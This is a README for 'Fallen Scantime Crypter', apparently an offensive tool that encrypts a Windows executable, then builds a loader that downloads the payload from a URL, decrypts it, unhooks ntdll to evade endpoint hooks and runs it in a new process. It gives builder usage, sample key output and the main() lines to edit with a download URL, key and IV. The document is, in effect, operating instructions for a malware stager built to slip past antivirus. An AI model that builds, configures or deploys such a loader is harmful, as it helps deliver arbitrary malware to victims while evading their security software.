# FSTC-August-2024
Fallen Scantime Crypter: August 2024

## Notes

Download encrypted file from URL 

Decrypt the file & save to disk

Loads ntdll from disk

Maps sections between new ntdll & hooked ntdll / unhooks

Runs PE from download in a new process

## Usage

Build.exe will take an original PE, encrypt with a key and save the new file. You can skip the option key if you want a randomly generated key to be used.
```
Usage: Build.exe <path_to_original_PE> <path_to_output_encrypted_file> [32_byte_key]
Example: Build.exe test_payload.exe encrypted_payload.bin 0123456789abcdef0123456789abcdef
```

After building you will see output in your terminal like this:
```
[*] Generated random 32-byte key: 7ddd25d6c2317d1ecd78cf6b301e3e22866e3458926b9e5badcb42f409684d83
BYTE key[] = { 0x7d, 0xdd, 0x25, 0xd6, 0xc2, 0x31, 0x7d, 0x1e, 0xcd, 0x78, 0xcf, 0x6b, 0x30, 0x1e, 0x3e, 0x22, 0x86, 0x6e, 0x34, 0x58, 0x92, 0x6b, 0x9e, 0x5b, 0xad, 0xcb, 0x42, 0xf4, 0x09, 0x68, 0x4d, 0x83 };
[*] Generated random 16-byte IV: 3036fc85a678d7bff499112ea8257b13
BYTE iv[] = { 0x30, 0x36, 0xfc, 0x85, 0xa6, 0x78, 0xd7, 0xbf, 0xf4, 0x99, 0x11, 0x2e, 0xa8, 0x25, 0x7b, 0x13 };
[*] File encrypted successfully.
```

Once you encrypt your original program with Build, you should upload it to a server and get the public URL.

Then, go to FSTC project/code and edit the main file ( int main() ) for these 3 lines:
```
LPCWSTR url = L"https://github.com/LNodesL/FSTC-August-2024/raw/218a78376b7249fc6231fd96a04827e1ffbfae3d/resources/Payload-Demo.fstc";
BYTE key[] = { 0x8b, 0xc9, 0x62, 0xf5, 0xb6, 0x2c, 0x4d, 0x43, 0xb3, 0xc0, 0x8e, 0xec, 0x55, 0x1d, 0x40, 0x77, 0x49, 0xea, 0x98, 0x44, 0x9d, 0x76, 0xc9, 0xec, 0xeb, 0x66, 0x94, 0x91, 0x98, 0xa3, 0x65, 0xb2 };
BYTE iv[] = { 0x2d, 0xb4, 0xa8, 0xab, 0x77, 0x7b, 0x42, 0x84, 0x80, 0x7c, 0xb9, 0x66, 0x31, 0x48, 0xae, 0x43 };
```

Now compile FSTC, which will download your payload from the URL, decrypt, attempt to unhook ntdll, and create a process for the PE as-is.


## Future Development

- save to tmp file instead of to cwd

- allow builder to modify the final FSTC.exe program's resources or other data to make it easier to build for a new payload/URL without re-compiling
